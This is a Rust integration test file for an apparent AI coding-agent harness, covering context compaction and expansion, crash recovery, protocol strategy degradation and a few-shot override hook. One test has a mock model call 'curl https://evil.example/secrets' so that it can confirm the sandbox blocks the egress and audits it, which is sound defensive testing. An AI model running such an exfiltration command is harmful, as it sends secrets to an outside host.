        ..Default::default()
    };
    let responses = vec![MockResponse {
        assistant_text: "explanation".into(),
        tool_calls: vec![mock_envelope_tool_call(&env)],
        overflow: None,
    }];
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(2);

    let report = runner.run("explain".into()).await.unwrap();
    assert_eq!(report.final_state, State::Done);

    let captured = events.lock();
    let mut saw = false;
    for ev in captured.iter() {
        if let Event::ClaimedChanges { changes } = ev {
            assert_eq!(changes.len(), 1);
            assert_eq!(changes[0].path, "src/lib.rs");
            assert_eq!(changes[0].kind, "edit");
            assert_eq!(changes[0].summary, "fix off-by-one in the parser");
            saw = true;
            break;
        }
    }
    assert!(saw, "no ClaimedChanges event observed on the bus");
}

// ---------- v60.5 §5 non-destructive compaction ----------

#[tokio::test]
async fn v60_5_compact_context_items_round_trips_through_dispatcher() {
    use atelier_cli::compaction;
    use atelier_cli::compaction_blob;
    use atelier_core::ledger::LedgerEntry;
    use runner::AdapterHandle;

    let workspace = tempfile::TempDir::new().unwrap();
    // Two queued responses: the first carries the envelope-done so
    // the runner exits after one turn; the second is a plain-text
    // "summary" the orchestrator's adapter.chat() will consume.
    let responses = vec![
        MockResponse {
            assistant_text: "ok".into(),
            tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
            overflow: None,
        },
        MockResponse {
            assistant_text: "Summary of items 1 and 2 (stubbed).".into(),
            tool_calls: vec![],
            overflow: None,
        },
    ];
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let dispatcher_handle = DispatcherHandle::new();
    let adapter_handle = AdapterHandle::new();
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_dispatcher_handle(dispatcher_handle.clone())
    .with_adapter_handle(adapter_handle.clone())
    .with_max_turns(2);

    let runner_task = tokio::spawn(async move { runner.run("seed prompt".into()).await });

    // Wait until both handles populate AND we observe a ContextItems
    // snapshot with at least two non-pinned items (the user prompt +
    // the assistant turn, both produced by the Runner's per-turn
    // context manager).
    let mut target_ids: Vec<String> = Vec::new();
    wait_until(
        || {
            if dispatcher_handle.get().is_none() || adapter_handle.get().is_none() {
                return false;
            }
            let snap = events.lock().clone();
            for ev in snap {
                if let Event::ContextItems { items } = ev {
                    let non_pinned: Vec<_> = items
                        .iter()
                        .filter(|i| !i.pinned)
                        .map(|i| i.id.clone())
                        .collect();
                    if non_pinned.len() >= 2 {
                        target_ids = non_pinned.into_iter().take(2).collect();
                        return true;
                    }
                }
            }
            false
        },
        std::time::Duration::from_secs(10),
        "ContextItems with >= 2 non-pinned items + handles populated",
    )
    .await;
    assert_eq!(target_ids.len(), 2);

    // The pre-queued second MockResponse above carries the summary
    // text; the orchestrator's `adapter.chat()` will consume it
    // when we run the compaction below.
    let adapter = adapter_handle.get().unwrap();
    let sd = dispatcher_handle.get().unwrap();
    let before = events.lock().len();

    // Run the compaction directly through the orchestrator (same code
    // path the GUI Tauri command + TUI Mutation::Compact delegate to).
    let sid = uuid::Uuid::new_v4().to_string();
    let now = "2026-05-17T11:00:00Z";
    let result = compaction::compact(
        adapter.as_ref(),
        sd.as_ref(),
        workspace.path(),
        &sid,
        target_ids.clone(),
        now,
    )
    .await
    .expect("orchestrator must succeed");
    assert!(result.summary_card_id.starts_with("mem-"));
    assert!(result.expansion_blob_path.contains(&sid));

    // Assert: among the events emitted AFTER `before`, we observe (in
    // order) a `LedgerAppended(ModelCall)`, a `LedgerAppended(Compaction)`,
    // a `ContextItems` snapshot lacking the compacted ids, a
    // `MemoryCards` snapshot containing the new summary, and a
    // `CompactionExecuted` event.
    let mut saw_model_call = false;
    let mut saw_compaction_entry = false;
    let mut saw_context_items_post = false;
    let mut saw_memory_cards_post = false;
    let mut saw_compaction_executed = false;
    wait_until(
        || {
            let snap = events.lock().clone();
            saw_model_call = false;
            saw_compaction_entry = false;
            saw_context_items_post = false;
            saw_memory_cards_post = false;
            saw_compaction_executed = false;
            for ev in snap.into_iter().skip(before) {
                match ev {
                    Event::LedgerAppended { entry } => match entry {
                        LedgerEntry::ModelCall { .. } => {
                            saw_model_call = true;
                        }
                        LedgerEntry::Compaction { replaced_items, .. } => {
                            if replaced_items == target_ids {
                                saw_compaction_entry = true;
                            }
                        }
                        _ => {}
                    },
                    Event::ContextItems { items } => {
                        if saw_compaction_entry && !items.iter().any(|i| target_ids.contains(&i.id))
                        {
                            saw_context_items_post = true;
                        }
                    }
                    Event::MemoryCards { cards } => {
                        if saw_compaction_entry
                            && cards.iter().any(|c| c.id == result.summary_card_id)
                        {
                            saw_memory_cards_post = true;
                        }
                    }
                    Event::CompactionExecuted {
                        summary_card_id, ..
                    } => {
                        if summary_card_id == result.summary_card_id {
                            saw_compaction_executed = true;
                        }
                    }
                    _ => {}
                }
            }
            saw_model_call
                && saw_compaction_entry
                && saw_context_items_post
                && saw_memory_cards_post
                && saw_compaction_executed
        },
        std::time::Duration::from_secs(10),
        "full event sequence for v60.5 compaction",
    )
    .await;

    // Blob on disk must round-trip back to the originals (by id).
    let blob = compaction_blob::read(workspace.path(), &result.expansion_blob_path)
        .expect("blob must be readable");
    let blob_ids: Vec<String> = blob.items.iter().map(|i| i.id.to_string()).collect();
    assert_eq!(blob_ids, target_ids);

    let _ = runner_task.await;
}

// ---------- v60.6 §5 Expand ----------

#[tokio::test]
async fn v60_6_expand_memory_card_round_trips_through_dispatcher() {
    use atelier_cli::compaction;
    use atelier_cli::expansion;
    use atelier_core::ledger::LedgerEntry;
    use runner::AdapterHandle;

    let workspace = tempfile::TempDir::new().unwrap();
    let responses = vec![
        MockResponse {
            assistant_text: "ok".into(),
            tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
            overflow: None,
        },
        MockResponse {
            assistant_text: "Summary of items 1 and 2 (stubbed).".into(),
            tool_calls: vec![],
            overflow: None,
        },
    ];
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let dispatcher_handle = DispatcherHandle::new();
    let adapter_handle = AdapterHandle::new();
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_dispatcher_handle(dispatcher_handle.clone())
    .with_adapter_handle(adapter_handle.clone())
    .with_max_turns(2);

    let runner_task = tokio::spawn(async move { runner.run("seed prompt".into()).await });

    // Wait for handles + a ContextItems snapshot with ≥ 2 non-pinned
    // items (same pre-flight as the v60.5 test).
    let mut target_ids: Vec<String> = Vec::new();
    wait_until(
        || {
            if dispatcher_handle.get().is_none() || adapter_handle.get().is_none() {
                return false;
            }
            let snap = events.lock().clone();
            for ev in snap {
                if let Event::ContextItems { items } = ev {
                    let non_pinned: Vec<_> = items
                        .iter()
                        .filter(|i| !i.pinned)
                        .map(|i| i.id.clone())
                        .collect();
                    if non_pinned.len() >= 2 {
                        target_ids = non_pinned.into_iter().take(2).collect();
                        return true;
                    }
                }
            }
            false
        },
        std::time::Duration::from_secs(10),
        "ContextItems with >= 2 non-pinned items + handles populated",
    )
    .await;
    assert_eq!(target_ids.len(), 2);

    let adapter = adapter_handle.get().unwrap();
    let sd = dispatcher_handle.get().unwrap();

    // Capture token totals BEFORE compaction so we can assert the
    // expansion cost matches.
    let pre_compact_items = sd
        .snapshot_context_items(&target_ids)
        .expect("snapshot pre-compact must succeed");
    let expected_cache_rewarm_tokens: u32 = pre_compact_items.iter().map(|i| i.tokens.count).sum();

    // ---- Step A: compact two items. ----
    let sid = uuid::Uuid::new_v4().to_string();
    let compact_result = compaction::compact(
        adapter.as_ref(),
        sd.as_ref(),
        workspace.path(),
        &sid,
        target_ids.clone(),
        "2026-05-17T11:00:00Z",
    )
    .await
    .expect("compaction must succeed");
    assert_eq!(compact_result.freed_tokens, expected_cache_rewarm_tokens);

    let before_expand = events.lock().len();

    // ---- Step B: expand the resulting summary card. ----
    let expand_result = expansion::expand(
        sd.as_ref(),
        workspace.path(),
        compact_result.summary_card_id.clone(),
        "2026-05-17T12:00:00Z",
    )
    .await
    .expect("expand must succeed");
    assert_eq!(expand_result.restored_item_count, 2);
    assert_eq!(
        expand_result.cache_rewarm_tokens,
        expected_cache_rewarm_tokens
    );
    assert_eq!(
        expand_result.summary_card_id,
        compact_result.summary_card_id
    );

    // ---- Step C: assert the post-expand event sequence. ----
    let mut saw_expansion_entry = false;
    let mut saw_context_items_post = false;
    let mut saw_memory_cards_post = false;
    let mut saw_expansion_executed = false;
    wait_until(
        || {
            let snap = events.lock().clone();
            saw_expansion_entry = false;
            saw_context_items_post = false;
            saw_memory_cards_post = false;
            saw_expansion_executed = false;
            for ev in snap.into_iter().skip(before_expand) {
                match ev {
                    Event::LedgerAppended {
                        entry:
                            LedgerEntry::Expansion {
                                restored_item_ids,
                                summary_card_id,
                                ..
                            },
                    } => {
                        if restored_item_ids == target_ids
                            && summary_card_id == compact_result.summary_card_id
                        {
                            saw_expansion_entry = true;
                        }
                    }
                    Event::LedgerAppended { .. } => {}
                    Event::ContextItems { items } => {
                        if saw_expansion_entry
                            && target_ids
                                .iter()
                                .all(|id| items.iter().any(|i| i.id == *id))
                        {
                            saw_context_items_post = true;
                        }
                    }
                    Event::MemoryCards { cards } => {
                        if saw_expansion_entry
                            && cards.iter().all(|c| c.id != compact_result.summary_card_id)
                        {
                            saw_memory_cards_post = true;
                        }
                    }
                    Event::ExpansionExecuted {
                        summary_card_id, ..
                    } => {
                        if summary_card_id == compact_result.summary_card_id {
                            saw_expansion_executed = true;
                        }
                    }
                    _ => {}
                }
            }
            saw_expansion_entry
                && saw_context_items_post
                && saw_memory_cards_post
                && saw_expansion_executed
        },
        std::time::Duration::from_secs(10),
        "full event sequence for v60.6 expansion",
    )
    .await;

    let _ = runner_task.await;
}

// ---------- Phase C close: pane visibility instrumentation ----------

#[tokio::test]
async fn run_writes_pane_visibility_when_driver_supplies_record() {
    use instrumentation::{PaneVisibility, PaneVisibilityRecord};

    let workspace = tempfile::TempDir::new().unwrap();

    let responses = vec![MockResponse {
        assistant_text: "ack".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];

    let panes = PaneVisibility {
        conversation: false,
        diff: true,
        plan: true,
        memory: false,
        context: true,
        mental_model: false,
    };
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Stdout,
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(1)
    .with_pane_visibility(panes.clone(), "headless");

    let report = runner.run("hello".into()).await.unwrap();
    assert_eq!(report.final_state, State::Done);

    // session dir lives under <workspace>/.atelier/sessions/<sid>/
    let sessions_root = workspace.path().join(".atelier").join("sessions");
    let entries: Vec<_> = std::fs::read_dir(&sessions_root)
        .unwrap()
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .collect();
    assert_eq!(entries.len(), 1, "expected exactly one session dir");
    let rec = PaneVisibilityRecord::load_from(&entries[0])
        .expect("pane_visibility.json should be present");
    assert_eq!(rec.panes, panes);
    assert_eq!(rec.driver, "headless");
}

#[tokio::test]
async fn run_skips_pane_visibility_when_driver_does_not_supply_record() {
    let workspace = tempfile::TempDir::new().unwrap();

    let responses = vec![MockResponse {
        assistant_text: "ack".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];

    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Stdout,
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(1);

    let _ = runner.run("hello".into()).await.unwrap();

    let sessions_root = workspace.path().join(".atelier").join("sessions");
    let entries: Vec<_> = std::fs::read_dir(&sessions_root)
        .unwrap()
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .collect();
    assert_eq!(entries.len(), 1);
    let pv = entries[0].join("pane_visibility.json");
    assert!(!pv.exists(), "no pane_visibility.json expected by default");
}

// ---------- v61 — §14 SIGKILL → resume mechanical gate ----------
//
// The full kill -9 path is platform-specific (POSIX-only `nix::sys::signal`
// and a subprocess setup) and CI-flaky on macOS sandbox; we exercise the
// same code path by *simulating* the post-kill state on disk:
//
//   1. Write an OnDiskSession to disk whose `conversation` ends with an
//      orphan `assistant` turn (tool_call emitted, no tool result) and a
//      `recovery_log` entry tagged `RecoveryReason::Crash`. This is the
//      exact shape `Runner::run`'s end-of-run save would leave behind if
//      the process died mid-`dispatch` after the assistant turn went on
//      the bus but before the tool result landed.
//   2. Spin a fresh `Runner::with_resume(uuid)` against the same workspace
//      with a Mock adapter that scripts the rest of the turn.
//   3. Capture the bus events. Assert:
//        a) `Event::MessageCommitted { role: System }` carries the
//           recovery_log entry (the prior partial output is preserved per
//           spec §14, not lost),
//        b) The orphan assistant turn is dropped per
//           `resume_conversation_prefix` (no spurious `tool_calls` in the
//           replayed conversation),
//        c) The final state reaches `State::Done` — resume hands off to
//           the normal turn loop cleanly.
#[tokio::test]
async fn sigkill_then_resume_recovers_partial_state_and_advances_to_done() {
    use atelier_core::persistence::{RecoveryEntry, RecoveryReason};
    use atelier_core::session::MessageRole;

    let workspace = tempfile::TempDir::new().unwrap();
    let resume_uuid = uuid::Uuid::new_v4();
    let session_dir = atelier_core::OnDiskSession::session_dir(workspace.path(), resume_uuid);

    // Simulate mid-tool-call crash: assistant turn with a tool_call but
    // no tool result, plus a recovery_log entry capturing the partial
    // output that was streaming when the process died.
    let mut crashed = atelier_core::OnDiskSession::fresh(
        resume_uuid,
        env!("CARGO_PKG_VERSION").to_string(),
        atelier_core::time::now_rfc3339(),
    );
    crashed.append_conversation_turn("turn-0", "user", "write a file then stop", None, Vec::new());
    crashed.append_conversation_turn(
        "turn-1",
        "assistant",
        "writing the file",
        None,
        vec![serde_json::json!({
            "tool_call_id": "tc-orphan",
            "tool_name": "write_file",
            "args": {"path": "x.txt", "content": "partial"},
        })],
    );
    crashed.append_recovery(RecoveryEntry {
        turn_id: "turn-1".into(),
        partial_content: "[stream interrupted: SIGKILL]".into(),
        captured_at: atelier_core::time::now_rfc3339(),
        reason: RecoveryReason::Crash,
    });
    crashed.save_to(&session_dir).expect("crash-state save");

    // Resume: scripted MockAdapter says "done" with claimed_done so the
    // run terminates after one turn.
    let responses = vec![MockResponse {
        assistant_text: "resumed and done".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(2)
    .with_resume(resume_uuid);

    // An empty post-resume prompt: we want to verify the resume prefix
    // alone is what feeds the model, not a fresh user turn.
    let report = runner.run(String::new()).await.unwrap();
    assert_eq!(
        report.final_state,
        State::Done,
        "resumed run should reach Done"
    );

    let captured = events.lock();

    // a) The recovery_log entry surfaced as a System message so the
    //    user sees what was preserved.
    let system_messages: Vec<String> = captured
        .iter()
        .filter_map(|e| match e {
            Event::MessageCommitted { role, text } if *role == MessageRole::System => {
                Some(text.clone())
            }
            _ => None,
        })
        .collect();
    assert!(
        system_messages.iter().any(|m| m.contains("[recovery]")),
        "expected a [recovery] system message; got {system_messages:?}"
    );
    assert!(
        system_messages
            .iter()
            .any(|m| m.contains("SIGKILL") || m.contains("partial")),
        "expected the partial_content to be surfaced; got {system_messages:?}"
    );

    // b) The resume prefix dropped the orphan assistant turn — the
    //    on-disk session after the resumed run no longer carries the
    //    `tc-orphan` tool_call.
    let resumed_on_disk =
        atelier_core::OnDiskSession::load_from(&session_dir).expect("post-resume session load");
    let orphan_present = resumed_on_disk.conversation.iter().any(|row| {
        row.get("tool_calls")
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter()
                    .any(|tc| tc.get("tool_call_id").and_then(|v| v.as_str()) == Some("tc-orphan"))
            })
            .unwrap_or(false)
    });
    assert!(
        !orphan_present,
        "orphan assistant tool_call should be truncated by resume_conversation_prefix"
    );

    // c) The recovery_log audit trail survives the round-trip (spec
    //    §14: partial output preserved, not re-emitted into conversation).
    assert!(
        resumed_on_disk
            .recovery_log
            .iter()
            .any(|r| r.reason == RecoveryReason::Crash),
        "Crash recovery_log entry should survive resume's re-save"
    );
}

// ---------- §11 sandbox egress mechanical gate ----------

/// Spec §11 acceptance gate: a `shell` tool call that tries `curl
/// evil.example` under the default deny-all-egress policy must (a) be
/// refused, (b) leave a single audit row on disk with the destination
/// and the originating tool_call_id, and (c) leave the session file
/// itself in a shape that survives `OnDiskSession::load_from` (the
/// load is the same validator the resume path runs through, so this
/// is the closest we get to "schema validation" without bringing
/// jsonschema-rs into the Rust gate).
///
/// The dispatch surface here uses `MockAdapter`'s scripted-tool-call
/// path; production goes through the same `Dispatcher::dispatch` for
/// every tool, so this test pins the producer end-to-end.
#[tokio::test]
async fn shell_curl_evil_example_is_blocked_and_audited() {
    use atelier_core::EgressEvent;

    let workspace = tempfile::TempDir::new().unwrap();

    let curl_call = ToolCallRequest {
        id: "tc-curl-evil".into(),
        name: "shell".into(),
        arguments: serde_json::json!({
            "command": "curl https://evil.example/secrets"
        }),
    };
    let responses = vec![
        MockResponse {
            assistant_text: "trying curl".into(),
            tool_calls: vec![curl_call],
            overflow: None,
        },
        MockResponse {
            assistant_text: "blocked, calling it done".into(),
            tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
            overflow: None,
        },
    ];

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(4);

    let report = runner
        .run("trigger egress".into())
        .await
        .expect("run should not error wholesale on a §11 block");

    // The §11 block is a per-tool-call failure; the run as a whole
    // can still reach Done if a later turn declares `claimed_done`.
    assert_eq!(report.final_state, State::Done);

    // (a) The session directory hosts an `audit.log` with exactly one
    //     newline-delimited JSON row, parseable as an `EgressEvent`.
    let session_dir: PathBuf = workspace
        .path()
        .join(".atelier")
        .join("sessions")
        .join(report.session_id.0.to_string());
    let audit_path = session_dir.join("audit.log");
    assert!(
        audit_path.exists(),
        "expected audit.log at {audit_path:?}; \
         session_dir contents: {:?}",
        std::fs::read_dir(&session_dir)
            .map(|it| it.flatten().map(|e| e.file_name()).collect::<Vec<_>>())
            .ok()
    );
    let body = std::fs::read_to_string(&audit_path).unwrap();
    let lines: Vec<&str> = body.lines().collect();
    assert_eq!(
        lines.len(),
        1,
        "expected exactly one audit row, got {body:?}"
    );

    let parsed: EgressEvent = serde_json::from_str(lines[0]).expect("audit row must be valid JSON");
    assert_eq!(parsed.version, 1);
    assert_eq!(parsed.kind, "subprocess-egress");
    assert_eq!(
        parsed.tool_call_id, "tc-curl-evil",
        "audit row must point at the originating ToolCallRequest::id"
    );
    assert_eq!(parsed.tool_name, "shell");
    assert_eq!(parsed.destination, "evil.example");
    assert_eq!(parsed.outcome, "blocked");
    assert_eq!(parsed.reason, "sandbox-deny-net");
    assert!(
        parsed.timestamp.ends_with('Z') && parsed.timestamp.len() == 20,
        "RFC 3339 second-precision Z-suffix expected, got {:?}",
        parsed.timestamp
    );

    // (b) The shell dispatch result was fed back into the next turn
    //     as a Role::Tool message — the error payload names the
    //     SandboxViolation. The bus carries that as a
    //     MessageCommitted with role=Tool. We pin the wire-string
    //     shape so a future refactor of the tool-error → message
    //     translation can't silently drop the failure mode.
    let captured = events.lock();
    let tool_results: Vec<String> = captured
        .iter()
        .filter_map(|e| match e {
            Event::MessageCommitted { role, text }
                if *role == atelier_core::session::MessageRole::Tool =>
            {
                Some(text.clone())
            }
            _ => None,
        })
        .collect();
    assert!(
        tool_results
            .iter()
            .any(|t| t.contains("evil.example") && t.to_lowercase().contains("sandbox")),
        "expected a Tool message describing the egress block; got {tool_results:?}"
    );

    // (c) session.json round-trips through OnDiskSession::load_from —
    //     the same validator the §14 resume path runs.
    drop(captured);
    let session_file = session_dir.join("session.json");
    assert!(
        session_file.exists(),
        "session.json missing at {session_file:?}"
    );
    let on_disk = atelier_core::OnDiskSession::load_from(&session_dir)
        .expect("session.json must round-trip via OnDiskSession::load_from");
    // The conversation log preserved the offending tool_call_id so an
    // auditor can correlate the audit row back to the model turn that
    // emitted it.
    let preserved = on_disk.conversation.iter().any(|row| {
        row.get("tool_calls")
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter().any(|tc| {
                    tc.get("tool_call_id").and_then(|v| v.as_str()) == Some("tc-curl-evil")
                })
            })
            .unwrap_or(false)
    });
    assert!(
        preserved,
        "tc-curl-evil should appear in the persisted conversation tool_calls"
    );
}

// ---------- §1 BYOM: conformance-driven strategy degradation ----------

/// §1 BYOM — conformance-driven degradation. Three back-to-back
/// malformed envelopes (no `harness_meta` tool call on the native-tool
/// path) inside a 3-call window trip the rolling-window threshold;
/// the runner walks NativeTool → JsonSentinel one-way and emits
/// `Event::StrategyDegraded` on the bus. The fourth response carries
/// a JSON-sentinel-encoded envelope (matching the *degraded* strategy)
/// so the run terminates cleanly after the degradation has fired.
///
/// Window + threshold are dialled down to (3, 3) so a four-turn
/// scripted run can exercise the path without queueing twenty mock
/// responses. The default (3-of-20) is exercised separately by the
/// `should_degrade*` unit tests in `protocol_conformance.rs`.
#[tokio::test]
async fn run_degrades_strategy_after_three_malformed_envelopes_in_window() {
    use atelier_core::protocol_strategy::{encode_json_sentinel, Strategy};

    let workspace = tempfile::TempDir::new().unwrap();

    // 1..3: malformed — text-only response, no harness_meta tool call.
    //       The runner parses on the active strategy (NativeTool, from
    //       the Mock capability defaults), `extract_native_envelope`
    //       returns `None`, the conformance buffer records a failure.
    // 4   : sentinel-wrapped envelope with claimed_done = true. By
    //       turn 4 the runner has already degraded to JsonSentinel,
    //       so the parser walks `parse_json_sentinel` and recovers a
    //       clean envelope. The loop sees `claimed_done` and exits.
    let sentinel_payload = encode_json_sentinel(&envelope_done()).unwrap();
    let responses = vec![
        MockResponse {
            assistant_text: "no envelope here".into(),
            tool_calls: vec![],
            overflow: None,
        },
        MockResponse {
            assistant_text: "still no envelope".into(),
            tool_calls: vec![],
            overflow: None,
        },
        MockResponse {
            assistant_text: "one more bad turn".into(),
            tool_calls: vec![],
            overflow: None,
        },
        MockResponse {
            assistant_text: format!("ok, here is the envelope\n\n{sentinel_payload}"),
            tool_calls: vec![],
            overflow: None,
        },
    ];

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(8)
    // Dial the rolling-window threshold down so a 4-turn fixture
    // exercises the degradation path without queueing 20 responses.
    // The default 3-of-20 is pinned by the `protocol_conformance`
    // unit tests.
    .with_degradation_window(3)
    .with_degradation_threshold(3);

    let report = runner.run("trigger degradation".into()).await.unwrap();
    assert_eq!(report.final_state, State::Done);

    let captured = events.lock();
    let degraded: Vec<_> = captured
        .iter()
        .filter_map(|e| match e {
            Event::StrategyDegraded { from, to, reason } => Some((*from, *to, reason.clone())),
            _ => None,
        })
        .collect();
    assert_eq!(
        degraded.len(),
        1,
        "expected exactly one StrategyDegraded event, got: {degraded:?}"
    );
    let (from, to, reason) = &degraded[0];
    assert_eq!(*from, Strategy::NativeTool, "should degrade off NativeTool");
    assert_eq!(*to, Strategy::JsonSentinel, "should land on JsonSentinel");
    assert!(
        reason.contains("malformed"),
        "reason should mention malformed envelopes, got: {reason}"
    );
}

/// Companion to the above: when the parses are clean from the first
/// turn, the runner does **not** emit `StrategyDegraded`. Pins the
/// "no false positives" half of the contract — without this a future
/// off-by-one in the parse-OK accounting would silently fire the
/// degrade arm on every successful run.
#[tokio::test]
async fn run_does_not_emit_strategy_degraded_when_envelopes_are_clean() {
    let workspace = tempfile::TempDir::new().unwrap();

    let responses = vec![MockResponse {
        assistant_text: "first turn, clean envelope".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(4)
    // Even with the threshold dialled to 1, a successful turn must
    // not fire StrategyDegraded — success is recorded as
    // `record_success`, not `record_failure`.
    .with_degradation_window(1)
    .with_degradation_threshold(1);

    let report = runner.run("clean run".into()).await.unwrap();
    assert_eq!(report.final_state, State::Done);

    let any_degraded = events
        .lock()
        .iter()
        .any(|e| matches!(e, Event::StrategyDegraded { .. }));
    assert!(
        !any_degraded,
        "StrategyDegraded must not fire when envelopes parse cleanly"
    );
}

// ---------- v60.9 §2 — per-adapter few-shot override hook ----------

/// Test adapter that:
///   * advertises a few-shot override for `JsonSentinel` (mimicking what
///     Anthropic / OpenAI-compat ship in production), and
///   * records every message slice it receives via `chat()` so the test
///     can assert the override messages appear at the head of the
///     per-turn message history.
///
/// Constructed inline here rather than baked into `MockAdapter` so the
/// existing adapter tests don't inherit the recording overhead.
struct MockAdapterWithOverride {
    inner: atelier_core::adapter::MockAdapter,
    received: Arc<parking_lot::Mutex<Vec<Vec<atelier_core::adapter::Message>>>>,
    override_messages: Vec<atelier_core::adapter::Message>,
}

impl MockAdapterWithOverride {
    fn new() -> Self {
        let inner = atelier_core::adapter::MockAdapter::new("mock:override-test");
        let override_messages = vec![
            atelier_core::adapter::Message::text(
                atelier_core::adapter::Role::User,
                "FEW_SHOT_USER_MARKER: rename foo to bar",
            ),
            atelier_core::adapter::Message::text(
                atelier_core::adapter::Role::Assistant,
                "FEW_SHOT_ASSISTANT_MARKER: <<<harness_meta>>>{}<<<end>>>",
            ),
        ];
        Self {
            inner,
            received: Arc::new(parking_lot::Mutex::new(Vec::new())),
            override_messages,
        }
    }

    fn queue_envelope_done_sentinel(&self) {
        use atelier_core::adapter::{ChatResponse, StreamChunk, Usage};
        use atelier_core::context::TokenSource;
        use atelier_core::protocol_strategy::{
            Strategy, HARNESS_META_NAME, SENTINEL_CLOSE, SENTINEL_OPEN,
        };
        let _ = HARNESS_META_NAME; // silence unused-import warning under partial cfg
        let env = envelope_done();
        let env_json = serde_json::to_string(&env).unwrap();
        let text = format!("done\n{SENTINEL_OPEN}{env_json}{SENTINEL_CLOSE}");
        self.inner.queue_stream(vec![StreamChunk::Complete {
            response: ChatResponse {
                text,
                tool_calls: vec![],
                usage: Usage {
                    prompt_tokens: 1,
                    completion_tokens: 1,
                    cached_tokens: None,
                    count_source: TokenSource::Approx,
                    latency_ms: Some(0),
                },
                strategy: Strategy::JsonSentinel,
                stop_reason: Some(atelier_core::adapter::StopReason::EndTurn),
            },
        }]);
    }

    fn queue_text_only(&self, text: &str) {
        use atelier_core::adapter::{ChatResponse, StreamChunk, Usage};
        use atelier_core::context::TokenSource;
        use atelier_core::protocol_strategy::Strategy;
        self.inner.queue_stream(vec![StreamChunk::Complete {
            response: ChatResponse {
                text: text.into(),
                tool_calls: vec![],
                usage: Usage {
                    prompt_tokens: 1,
                    completion_tokens: 1,
                    cached_tokens: None,
                    count_source: TokenSource::Approx,
                    latency_ms: Some(0),
                },
                strategy: Strategy::JsonSentinel,
                stop_reason: Some(atelier_core::adapter::StopReason::EndTurn),
            },
        }]);
    }
}

#[async_trait::async_trait]
impl atelier_core::adapter::Adapter for MockAdapterWithOverride {
    fn model_id(&self) -> &str {
        self.inner.model_id()
    }

    fn capabilities(&self) -> atelier_core::adapter::Capabilities {
        self.inner.capabilities()
    }

    fn conformance(&self) -> atelier_core::protocol_conformance::ConformanceSnapshot {
        self.inner.conformance()
    }

    async fn count_tokens(
        &self,
        messages: &[atelier_core::adapter::Message],
    ) -> Result<atelier_core::adapter::TokenCount, atelier_core::adapter::AdapterError> {
        self.inner.count_tokens(messages).await
    }

    async fn chat(
        &self,
        messages: &[atelier_core::adapter::Message],
        tools: &[atelier_core::adapter::ToolSpec],
    ) -> Result<atelier_core::adapter::ChatResponse, atelier_core::adapter::AdapterError> {
        self.received.lock().push(messages.to_vec());
        self.inner.chat(messages, tools).await
    }

    async fn stream(
        &self,
        messages: &[atelier_core::adapter::Message],
        tools: &[atelier_core::adapter::ToolSpec],
    ) -> Result<atelier_core::adapter::ChunkStream, atelier_core::adapter::AdapterError> {
        self.received.lock().push(messages.to_vec());
        self.inner.stream(messages, tools).await
    }

    fn few_shot_override(
        &self,
        strategy: atelier_core::protocol_strategy::Strategy,
    ) -> Option<Vec<atelier_core::adapter::Message>> {
        match strategy {
            atelier_core::protocol_strategy::Strategy::JsonSentinel => {
                Some(self.override_messages.clone())
            }
            _ => None,
        }
    }
}

#[tokio::test]
async fn few_shot_override_prepends_adapter_messages_to_per_turn_history() {
    // Custom adapter advertises an override; the runner must consult it
    // at session start and place the returned messages at the head of
    // the per-turn message history sent to `adapter.chat()`. The
    // override is keyed on the active §2 strategy; we cap the
    // MockAdapter capabilities so the runner picks JsonSentinel.
    use atelier_core::adapter::{Capabilities, CapabilityClaim};

    let workspace = tempfile::TempDir::new().unwrap();
    // Force JsonSentinel by declaring native_tool_use as Unsupported.
    // The Skip probe-policy branch in `Runner::run` reads this and
    // selects JsonSentinel as the starting strategy.
    let caps = Capabilities {
        native_tool_use: CapabilityClaim::Unsupported,
        streaming: CapabilityClaim::Supported,
        vision: CapabilityClaim::Unsupported,
        prompt_cache: CapabilityClaim::Unsupported,
        structured_output: CapabilityClaim::Supported,
